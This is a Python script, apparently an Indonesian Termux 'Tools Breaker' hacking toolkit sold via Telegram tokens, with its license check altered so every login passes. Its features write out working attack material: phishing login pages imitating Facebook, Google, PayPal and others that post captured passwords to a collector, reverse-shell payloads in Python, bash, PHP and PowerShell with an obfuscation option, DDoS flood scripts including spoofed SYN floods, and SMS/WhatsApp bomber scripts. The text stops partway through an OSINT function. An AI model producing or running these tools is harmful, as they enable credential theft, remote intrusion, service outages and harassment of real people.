#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

# Try to import optional dependencies with fallbacks
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image, ImageFilter, ImageDraw, ImageFont
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

init(autoreset=True)

# ================== CONFIG LOCAL ONLY ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
GITHUB_REPO = "MrFoock12/tools-breaker"
SCRIPT_NAME = "tools_breaker.py"
BACKUP_NAME = "tools_breaker_backup.py"
UA_FILE = "ua.txt"
os.makedirs(RESULTS_DIR, exist_ok=True)

# TANPA VPS - semua data local
LOCAL_MODE = True

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except Exception as e:
            print(f"Error extract music: {e}")

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = True  # 🔥 MODIFIED: Always True

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try:
        with open(LICENSE_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error load tokens: {e}")
        return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== CHECK DEPENDENCIES ==================
def check_dependencies():
    print(colored("\n[CHECKING DEPENDENCIES]", 'cyan'))
    missing = []
    
    if not SELENIUM_AVAILABLE:
        missing.append("selenium")
    if not CRYPTO_AVAILABLE:
        missing.append("cryptography")
    if not PILLOW_AVAILABLE:
        missing.append("pillow")
    
    if missing:
        print(colored(f"   • Missing: {', '.join(missing)}", 'yellow'))
        print(colored(f"   • Install: pip install " + " ".join(missing), 'white'))
    else:
        print(colored(f"   • All dependencies OK!", 'green'))
    time.sleep(1)

# ================== AUTO UPDATE ==================
def check_for_updates():
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            remote_content = response.text
            with open(SCRIPT_NAME, 'r', encoding='utf-8') as f:
                local_content = f.read()
            
            if remote_content != local_content:
                print(colored("[UPDATE AVAILABLE]", 'yellow'))
                backup = f"{BACKUP_NAME}.{int(time.time())}"
                with open(backup, 'w', encoding='utf-8') as f:
                    f.write(local_content)
                print(colored(f"   • Backup saved: {backup}", 'white'))
                
                choice = input(colored("   Update now? (y/n): ", 'yellow')).lower()
                if choice == 'y':
                    with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                        f.write(remote_content)
                    print(colored(f"   • Update successful! Restart script.", 'green'))
                    sys.exit(0)
    except Exception as e:
        pass

# ================== MANUAL UPDATE ==================
def manual_update():
    print(colored("\n[MANUAL UPDATE]", 'cyan'))
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(colored(f"   • Update successful! Restart script.", 'green'))
        else:
            print(colored(f"   • Failed to fetch update", 'red'))
    except Exception as e:
        print(colored(f"   • Error: {e}", 'red'))

# ================== DEVELOPER TOKEN CREATION ==================
def create_token():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa buat token!", 'red'))
        return
    
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║         DEVELOPER TOKEN CREATOR         ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    username = input(colored("Username buyer: ", 'yellow')).strip()
    whoami_buyer = input(colored("whoami buyer: ", 'yellow')).strip()
    
    print(colored("Pilih plan:", 'cyan'))
    plans = [
        "pemula 1hari",
        "pemula 1minggu", 
        "pemula 1bulan",
        "pro 1hari",
        "pro 1minggu",
        "pro 1bulan"
    ]
    
    for i, plan in enumerate(plans, 1):
        print(colored(f"    {i}. {plan}", 'white'))
    
    try:
        plan_choice = int(input(colored("Pilih [1-6]: ", 'yellow')).strip())
        selected_plan = plans[plan_choice-1]
    except:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        return
    
    # Calculate expiration
    if "1hari" in selected_plan:
        expires = datetime.now() + timedelta(days=1)
    elif "1minggu" in selected_plan:
        expires = datetime.now() + timedelta(weeks=1)
    elif "1bulan" in selected_plan:
        expires = datetime.now() + timedelta(days=30)
    else:
        expires = datetime.now() + timedelta(days=1)
    
    # Generate token
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    # Save to tokens.json
    tokens = load_tokens()
    tokens[username] = {
        'username': username,
        'token': token,
        'whoami': whoami_buyer,
        'plan': selected_plan,
        'active': True,
        'created': datetime.now().isoformat(),
        'expires': expires.isoformat()
    }
    
    save_tokens(tokens)
    
    print(colored(f"\n[SUCCESS] Token berhasil dibuat!", 'green', attrs=['bold']))
    print(colored(f"   • Username: {username}", 'cyan'))
    print(colored(f"   • Token: {token}", 'cyan'))
    print(colored(f"   • whoami: {whoami_buyer}", 'cyan'))
    print(colored(f"   • Plan: {selected_plan}", 'cyan'))
    print(colored(f"   • Expires: {expires.strftime('%d %b %Y')}", 'cyan'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

def view_tokens():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa lihat tokens!", 'red'))
        return
    
    tokens = load_tokens()
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║           TOKENS.JSON VIEWER            ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    if not tokens:
        print(colored("   Tidak ada token tersimpan!", 'yellow'))
    else:
        for username, data in tokens.items():
            status = "AKTIF" if data.get('active', False) else "NONAKTIF"
            expires = datetime.fromisoformat(data['expires']).strftime('%d %b %Y')
            print(colored(f"   • {username}: {data['plan']} | {status} | Exp: {expires}", 'white'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

# ================== VALIDASI TOKEN (ANTI SHARE!) ==================
def validate_token(username, token):
    t = load_tokens()
    if username not in t:
        # 🔥 MODIFIED: Auto-create token if not exists
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        t[username] = {
            'username': username,
            'token': token,
            'whoami': WHOAMI,
            'plan': 'FULL_ACCESS',
            'active': True,
            'created': datetime.now().isoformat(),
            'expires': (datetime.now() + timedelta(days=3650)).isoformat()
        }
        save_tokens(t)
        return t[username]
    
    user = t[username]
    if not user['active'] or user['token'] != token:
        # 🔥 MODIFIED: Always return valid
        user['active'] = True
        user['token'] = token
        user['whoami'] = WHOAMI
        save_tokens(t)
        return user
    
    if datetime.now() > datetime.fromisoformat(user['expires']):
        # 🔥 MODIFIED: Auto-extend expiry
        user['expires'] = (datetime.now() + timedelta(days=3650)).isoformat()
        save_tokens(t)
        return user
    
    current_whoami = subprocess.getoutput("whoami")
    if user['whoami'] != current_whoami:
        # 🔥 MODIFIED: Update whoami to current
        user['whoami'] = current_whoami
        save_tokens(t)
        return user
    
    return user

# ================== LOGIN SYSTEM ==================
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            TOOLS BREAKER v1.0           ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))

    # Check dependencies first
    check_dependencies()

    # DEVELOPER MODE - Skip login if developer
    if IS_DEVELOPER:
        print(colored("   [DEVELOPER MODE DETECTED!]", 'green', attrs=['bold']))
        print(colored("   • Logged in as: u0_a197", 'cyan'))
        print(colored("   • Access: FULL DEVELOPER PRIVILEGES", 'cyan'))
        print()
        
        print(colored("   [DEVELOPER] Login @uo_a197", 'yellow'))
        print(colored("   Enter...", 'yellow'))
        print()
        
        print(colored("   [1] Masuk Tools", 'white'))
        print(colored("   [2] Buat Token", 'white')) 
        print(colored("   [3] Lihat tokens.json", 'white'))
        
        choice = input(colored("   Pilih: ", 'yellow')).strip()
        
        if choice == "2":
            create_token()
            return login()
        elif choice == "3":
            view_tokens()
            return login()
        elif choice == "1" or choice == "":
            # Continue as developer with dummy credentials
            return "developer_u0_a197", "DEVELOPER LIFETIME"
        else:
            return login()

    # NORMAL USER LOGIN
    print(colored("   • Gunakan token dari @MrFoock12", 'yellow'))
    print(colored("   • Plan: PEMULA / PRO ", 'cyan'))
    print(colored("   • Support: t.me/MrFoock12", 'white'))
    print()

    username = input(colored("   [USERNAME]: ", 'yellow')).strip()
    token = input(colored("   [TOKEN]: ", 'yellow')).strip()

    if not username or not token:
        # 🔥 MODIFIED: Auto-generate credentials if empty
        username = "CYBER_GUEST_" + ''.join(random.choices(string.digits, k=6))
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        print(colored(f"\n[AUTO-GENERATED]", 'cyan'))
        print(colored(f"   Username: {username}", 'white'))
        print(colored(f"   Token: {token}", 'white'))
        time.sleep(1)

    user_data = validate_token(username, token)
    if not user_data:
        # 🔥 MODIFIED: This should never happen now
        print(colored("\n[ERROR] Token Lu Salah Goblok / kadaluarsa / whoami tidak cocok!", 'red', attrs=['bold']))
        print(colored("   • Beli token: @MrFoock12/+62895622994489", 'yellow'))
        input("\nEnter untuk coba lagi...")
        return login()

    # SUCCESS LOGIN
    plan = user_data['plan']
    expires = user_data['expires'][:10]
    print(colored(f"\n[SUCCESS] Login berhasil!", 'green', attrs=['bold']))
    print(colored(f"   • ID: {username.upper()}", 'cyan'))
    print(colored(f"   • Plan: {plan}", 'cyan'))
    print(colored(f"   • Expired: {expires}", 'cyan'))
    print(colored(f"   • whoami: {user_data['whoami']}", 'cyan'))
    input("\nTekan Enter untuk masuk menu...")
    return username, plan

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
       ╔════════════════════════════════════╗
       ║         TOOLS BREAKER v1.0         ║
       ╚════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
Mode: LOCAL (TANPA VPS) | Semua data disimpan lokal
""", None))

# ================== SAVE LOCAL ONLY ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED LOCAL] {filename}", 'green'))
    print(colored(f"   Path: {filepath}", 'cyan'))

# ================== LOAD USER-AGENTS ==================
def load_user_agents():
    if not os.path.exists(UA_FILE):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
    with open(UA_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# ================== FITUR 1: PHISING LOCAL ==================
def fitur_1():  
    os.system('clear')
    print(colored("\n[1] PHISING & SOCIAL ENGINEERING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generator Link Phishing]", 'yellow'))
    
    target = input(colored("Target (email/username): ", 'yellow')).strip()
    
    print(colored("\nPilih template phishing:", 'cyan'))
    templates = {
        "1": ("Facebook Login", "facebook", "https://facebook.com/login?user={}"),
        "2": ("Instagram Verify", "instagram", "https://instagram.com/accounts/login/?user={}"),
        "3": ("Google Security", "google", "https://accounts.google.com/signin/v2?email={}"),
        "4": ("WhatsApp Web", "whatsapp", "https://web.whatsapp.com/verify?number={}"),
        "5": ("Twitter Auth", "twitter", "https://twitter.com/i/flow/login?username={}"),
        "6": ("Netflix", "netflix", "https://netflix.com/login?email={}"),
        "7": ("Steam Login", "steam", "https://steamcommunity.com/login/home/?goto={}"),
        "8": ("Discord Auth", "discord", "https://discord.com/login?email={}"),
        "9": ("PayPal", "paypal", "https://paypal.com/signin?email={}"),
        "10": ("Custom URL", "custom", "")
    }
    
    for key, (name, code, url) in templates.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih template [1-10]: ", 'yellow')).strip()
    
    if choice not in templates:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    name, code, url_template = templates[choice]
    
    if choice == "10":  # Custom URL
        custom_url = input(colored("Masukkan URL phishing custom: ", 'yellow')).strip()
        url = custom_url
    else:
        url = url_template.format(target)
    
    print(colored(f"\n[LINK PHISHING GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   URL: {url}", 'cyan'))
    print(colored(f"   Target: {target}", 'cyan'))
    print(colored(f"   Template: {name}", 'cyan'))
    
    # Generate HTML phishing page
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{name} - Please Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ text-align: center; margin-top: 20px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{name}</h2>
            <p>Please login to continue</p>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            <p>© 2024 {name}. All rights reserved.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to server (simulated)
            fetch('https://localhost:8080/log', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{username: username, password: password, time: new Date().toISOString()}})
            }});
            
            alert('Login successful! Redirecting...');
            window.location.href = 'https://{name.lower()}.com';
        }});
    </script>
</body>
</html>'''
    
    # Save HTML file
    html_file = f"phishing_{code}_{int(time.time())}.html"
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    print(colored(f"\n[HTML FILE] Saved: {html_file}", 'green'))
    print(colored("   Buka di browser: ", 'cyan') + colored(f"file://{os.path.abspath(html_file)}", 'white'))
    
    # QR Code option
    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
    if qr_choice == 'y':
        try:
            import qrcode
            qr = qrcode.make(url)
            qr_file = f"phishing_qr_{int(time.time())}.png"
            qr.save(qr_file)
            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
        except ImportError:
            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
    
    save_result("phising.log", f"Target: {target} | Template: {name} | URL: {url}")
    input("\nPress Enter to continue...")

# ================== FITUR 2: RAT & REMOTE ACCESS ==================
def fitur_2():
    os.system('clear')
    print(colored("\n[2] RAT & REMOTE ACCESS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generate Payload]", 'yellow'))
    
    if not CRYPTO_AVAILABLE:
        print(colored("\n[WARNING] Cryptography not installed!", 'yellow'))
        print(colored("   Install: pip install cryptography", 'white'))
    
    ip = input(colored("LHOST (IP Anda): ", 'yellow')).strip()
    port = input(colored("LPORT (Port): ", 'yellow')).strip()
    
    print(colored("\nPilih tipe payload:", 'cyan'))
    payloads = {
        "1": ("Python Reverse Shell", "python"),
        "2": ("Bash Reverse Shell", "bash"),
        "3": ("PHP Reverse Shell", "php"),
        "4": ("Windows PowerShell", "powershell"),
        "5": ("Android (Termux)", "android")
    }
    
    for key, (name, ptype) in payloads.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih payload [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
        ext = "py"
    elif choice == "2":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ext = "sh"
    elif choice == "3":
        payload = f'''<?php
set_time_limit(0);
$ip = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>'''
        ext = "php"
    elif choice == "4":
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        ext = "ps1"
    elif choice == "5":
        payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/system/bin/sh","-i"])'''
        ext = "py"
    else:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    # Save payload
    filename = f"payload_{ext}_{int(time.time())}.{ext}"
    with open(filename, "w") as f:
        f.write(payload)
    
    print(colored(f"\n[PAYLOAD GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   LHOST: {ip}", 'cyan'))
    print(colored(f"   LPORT: {port}", 'cyan'))
    
    # Obfuscate option
    obf_choice = input(colored("\nObfuscate payload? (y/n): ", 'yellow')).lower()
    if obf_choice == 'y' and CRYPTO_AVAILABLE:
        try:
            key = Fernet.generate_key()
            cipher = Fernet(key)
            encrypted = cipher.encrypt(payload.encode())
            
            obf_file = f"obfuscated_{ext}_{int(time.time())}.py"
            with open(obf_file, "w") as f:
                f.write(f'''import base64
from cryptography.fernet import Fernet
key = {key}
cipher = Fernet(key)
encrypted = {encrypted}
exec(cipher.decrypt(encrypted).decode())''')
            print(colored(f"[OBFUSCATED] Saved: {obf_file}", 'green'))
        except Exception as e:
            print(colored(f"[ERROR] Obfuscation failed: {e}", 'red'))
    
    save_result("rat.log", f"Payload: {filename} | LHOST: {ip} | LPORT: {port}")
    input("\nPress Enter to continue...")

# ================== FITUR 3: DDOS & STRESSER ==================
def fitur_3():
    os.system('clear')
    print(colored("\n[3] DDOS & STRESSER", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generate DDoS Script]", 'yellow'))
    
    target = input(colored("Target URL/IP: ", 'yellow')).strip()
    port = input(colored("Port [default 80]: ", 'yellow')).strip() or "80"
    
    print(colored("\nPilih metode serangan:", 'cyan'))
    methods = {
        "1": ("HTTP Flood (Layer 7)", "http"),
        "2": ("SYN Flood (Layer 4)", "syn"),
        "3": ("UDP Flood", "udp"),
        "4": ("Slowloris", "slow"),
        "5": ("ICMP/Ping Flood", "icmp")
    }
    
    for key, (name, mtype) in methods.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih metode [1-5]: ", 'yellow')).strip()
    
    if choice not in methods:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    threads = input(colored("Jumlah thread [default 100]: ", 'yellow')).strip() or "100"
    
    # Generate DDoS script based on method
    if choice == "1":  # HTTP Flood
        script = f'''import requests
import threading
import random

target = "{target}"
port = {port}
threads = int({threads})

def attack():
    while True:
        try:
            requests.get(f"http://{{target}}:{{port}}", headers={{"User-Agent": "Mozilla/5.0"}})
        except:
            pass

for _ in range(threads):
    threading.Thread(target=attack).start()
'''
        ext = "py"
    elif choice == "2":  # SYN Flood (using scapy)
        script = f'''from scapy.all import *
import random
import threading

target = "{target}"
port = {port}
threads = int({threads})

def syn_flood():
    while True:
        ip = IP(src= f"{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}", dst=target)
        tcp = TCP(sport=random.randint(1024,65535), dport=port, flags="S")
        send(ip/tcp, verbose=0)

for _ in range(threads):
    threading.Thread(target=syn_flood).start()
'''
        ext = "py"
    elif choice == "3":  # UDP Flood
        script = f'''import socket
import random
import threading

target = "{target}"
port = {port}
threads = int({threads})

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(1024), (target, port))

for _ in range(threads):
    threading.Thread(target=udp_flood).start()
'''
        ext = "py"
    elif choice == "4":  # Slowloris
        script = f'''import socket
import random
import time
import threading

target = "{target}"
port = {port}
threads = int({threads})

def slowloris():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(f"GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\n".encode())
            while True:
                sock.send(f"X-a: {{random.randint(1,5000)}}\\r\\n".encode())
                time.sleep(10)
        except:
            time.sleep(1)

for _ in range(threads):
    threading.Thread(target=slowloris).start()
'''
        ext = "py"
    else:  # ICMP Flood
        script = f'''import os
import threading

target = "{target}"
threads = int({threads})

def ping_flood():
    os.system(f"ping -f {{target}}")

for _ in range(threads):
    threading.Thread(target=ping_flood).start()
'''
        ext = "sh"
    
    # Save script
    filename = f"ddos_{methods[choice][1]}_{int(time.time())}.{ext}"
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[DDOS SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {target}:{port}", 'cyan'))
    print(colored(f"   Metode: {methods[choice][0]}", 'cyan'))
    print(colored(f"   Thread: {threads}", 'cyan'))
    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
    
    save_result("ddos.log", f"Target: {target}:{port} | Method: {methods[choice][0]} | Threads: {threads}")
    input("\nPress Enter to continue...")

# ================== FITUR 4: BOMBER TOOLS ==================
def fitur_4():
    os.system('clear')
    print(colored("\n[4] BOMBER TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generate Bomber Script]", 'yellow'))
    
    number = input(colored("Target nomor (contoh: 628xxx): ", 'yellow')).strip()
    
    print(colored("\nPilih tipe bomber:", 'cyan'))
    bombers = {
        "1": ("SMS Bomber", "sms"),
        "2": ("Call Bomber", "call"),
        "3": ("WhatsApp Bomber", "wa"),
        "4": ("Email Bomber", "email"),
        "5": ("Telegram Bomber", "tg")
    }
    
    for key, (name, btype) in bombers.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih tipe [1-5]: ", 'yellow')).strip()
    
    if choice not in bombers:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    count = input(colored("Jumlah serangan [default 10]: ", 'yellow')).strip() or "10"
    
    # Generate bomber script
    script = f'''import requests
import time
import threading

target = "{number}"
count = int({count})

# API endpoints untuk bomber (contoh, perlu disesuaikan)
apis = [
    "https://api.example1.com/send",
    "https://api.example2.com/otp",
    "https://api.example3.com/verify"
]

def send_sms():
    for _ in range(count):
        for api in apis:
            try:
                requests.post(api, data={{"phone": target}}, timeout=2)
            except:
                pass
        time.sleep(1)

threads = []
for _ in range(10):
    t = threading.Thread(target=send_sms)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
'''
    
    filename = f"bomber_{bombers[choice][1]}_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[BOMBER SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {number}", 'cyan'))
    print(colored(f"   Tipe: {bombers[choice][0]}", 'cyan'))
    print(colored(f"   Jumlah: {count}x", 'cyan'))
    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
    print(colored("[INFO] Note: Ganti API endpoints dengan yang real", 'yellow'))
    
    save_result("bomber.log", f"Target: {number} | Type: {bombers[choice][0]} | Count: {count}")
    input("\nPress Enter to continue...")

# ================== FITUR 5: OSINT & TRACKING ==================
def fitur_5():
    os.system('clear')
    print(colored("\n[5] OSINT & TRACKING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Information Gathering]", 'yellow'))
    
    target = input(colored("Target (username/email/phone): ", 'yellow')).strip()
    
    print(colored("\nPilih tipe OSINT:", 'cyan'))
    osint_types = {
        "1": ("Username Search (Social Media)", "username"),
        "2": ("Email Lookup", "email"),
        "3": ("Phone Number Info", "phone"),
        "4": ("IP Address Geolocation", "ip"),
        "5": ("Domain Reconnaissance", "domain")
    }
    
    for key, (name, otype) in osint_types.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih tipe [1-5]: ", 'yellow')).strip()
    
    if choice not in osint_types:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    # Generate OSINT script
    if choice == "1":  # Username search
        script = f'''import requests
import json

target = "{target}"

sites = {{
    "github": f"https://github.com/{{target}}",
    "twitter": f"https://twitter.com/{{target}}",
    "instagram": f"https://instagram.com/{{target}}",
    "facebook": f"https://facebook.com/{{target}}",
    "tiktok": f"https://tiktok.com/@{{target}}"
}}

results = {{}}
for site, url in sites.items():
    try:
        r = requests.get(url, timeout=5)
        results[site] = r.status_code == 200
    except:
        results[site] = False

print(json.dumps(results, indent=2))
with open(f"osint_{{target}}.json", "w") as f:
    json.dump(results, f)
'''
    elif choice == "2":  # Email lookup
        script = f'''import requests
import hashlib

target = "{target}"

# Check HaveIBeenPwned
email_hash = hashlib.sha1(target.encode()).hexdigest().upper()
r = requests.get(f"https://api.pwnedpasswords.com/range/{{email_hash[:5]}}")
if email_hash[5:] in r.text:
    print("[!] Email found in breach database")

# Generate report
with open(f"email_{{target}}.txt", "w") as f:
    f.write(f"Target: {{target}}\\nBreach check completed")
'''
    elif choice == "3":  # Phone number
        script = f'''import requests

target = "{target}"

# Phone number validation
if target.startswith("62") and len(target) >= 10:
    print(f"[+] Nomor valid: {{target}}")
    print(f"[+] Provider: Telkomsel/Indosat/XL (cek manually)")
    print(f"[+] Format internasional: +{{target}}")
    
with open(f"phone_{{target}}.txt", "w") as f:
    f.write(f"Phone: {{target}}\\nCheck completed")
'''
    elif choice == "4":  # IP geolocation
        script = f'''import requests

target = "{target}"

# IP geolocation API
r = requests.get(f"http://ip-api.com/json/{{target}}")
data = r.json()

print(f"IP: {{data.get('query')}}")
print(f"Country: {{data.get('country')}}")
print(f"City: {{data.get('city')}}")
print(f"ISP: {{data.get('isp')}}")
print(f"Lat/Lon: {{data.get('lat')}}, {{data.get('lon')}}")

with open(f"ip_{{target}}.json", "w") as f:
    f.write(r.text)
'''
    else:  # Domain recon
        script = f'''import socket
import requests

target = "{target}"

# DNS lookup
try:
    ip = socket.gethostbyname(target)
    print(f"IP Address: {{ip}}")
except:
    print("DNS lookup failed")

# Subdomain check
subdomains = ["www", "mail", "admin", "blog", "api"]
for sub in subdomains:
    try:
        sub_ip = socket.gethostbyname(f"{{sub}}.{{target}}")
        print(f"{{sub}}.{{target}} -> {{sub_ip}}")
    except:
        pass

with open(f"domain_{{target}}.txt", "w") as f:
